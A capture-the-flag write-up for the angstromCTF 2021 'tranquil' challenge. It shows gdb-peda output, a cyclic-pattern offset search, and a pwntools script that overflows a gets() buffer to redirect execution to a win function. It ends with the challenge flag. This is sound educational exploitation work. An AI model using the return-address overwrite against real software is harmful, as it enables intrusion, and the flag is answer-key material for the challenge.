#### Challenge:

Finally, [inner peace](./tranquil ":ignore") - Master Oogway

[Source](./tranquil.c ":ignore")

Connect with `nc shell.actf.co 21830`, or find it on the shell server at `/problems/2021/tranquil`.

---

#### Solution:

Another buffer overflow caused by `gets` function called in `vuln` function. This time we need to overwrite the `vuln` function's return pointer to get to the `win` function that is `not` even called from `main`. So we need to figure out two things, what is the destination we want to jump to - that would be stack address of the `win` function, and where to put this information - that would be return address of the `vuln` function. 

Using [gdb-peda](https://github.com/longld/peda) *(Note to self: Installation of `gdb-peda` may require actual reinstallation of gdb - don't know why)*, the command `info functions` reveals the address of the `win` function: 

```text
...
0x0000000000401196  win
0x0000000000401204  vuln
0x0000000000401261  main
...
```

Next we use `pattc 200` command to generate `De Bruijn cyclic pattern`:

```
gdb-peda$ pattc 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
```

We feed the pattern to the binary to find out the offset of the return address.

```
gdb-peda$ run
Starting program: tranquil 
Enter the secret word: 
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
Login failed!

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7ed2f33 (<__GI___libc_write+19>:	cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x7ffff7fa3723 --> 0xfa5670000000000a 
RDI: 0x7ffff7fa5670 --> 0x0 
RBP: 0x4141334141644141 ('AAdAA3AA')
RSP: 0x7fffffffdb08 ("IAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
RIP: 0x401260 (<vuln+92>:	ret)
R8 : 0xe 
R9 : 0x0 
R10: 0xfffffffffffff28d 
R11: 0x246 
R12: 0x4010b0 (<_start>:	endbr64)
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
...
```

From the crash output we see that the base pointer's (`RBP`) value is `AAdAA3AA`. We can use the value to get the offset in the pattern using `patto` command:

```
gdb-peda$ patto AAdAA3AA
AAdAA3AA found at offset: 64
```

So we need to fill the whole buffer (`64 bytes`), then overwrite the base pointer - `RBP` (`8 bytes`) and finally overwrite the return address with the address of the `win` function (`0x401196`):

```python
#!/usr/bin/env python

from pwn import *
from struct import *

for i in range(1, 2):
    print(i)

    #r = remote('shell.actf.co', 21830)
    r = process('./tranquil')

    print(r.recvuntil("Enter the secret word: ").decode('utf-8').strip())

    payload = b'A'*(64) + b'B'*8 + pack("<Q", 0x0000000000401196)

    print(payload)

    r.sendline(payload)

    print(r.recvline().decode('utf-8').strip())
    print(r.recvline().decode('utf-8').strip())
    print(r.recvline().decode('utf-8').strip())
    print(r.recvline().decode('utf-8').strip())
    r.close()
```

---

<details><summary>FLAG:</summary>

```text
actf{time_has_gone_so_fast_watching_the_leaves_fall_from_our_instruction_pointer_864f647975d259d7a5bee6e1}
```

</details>
<br/>
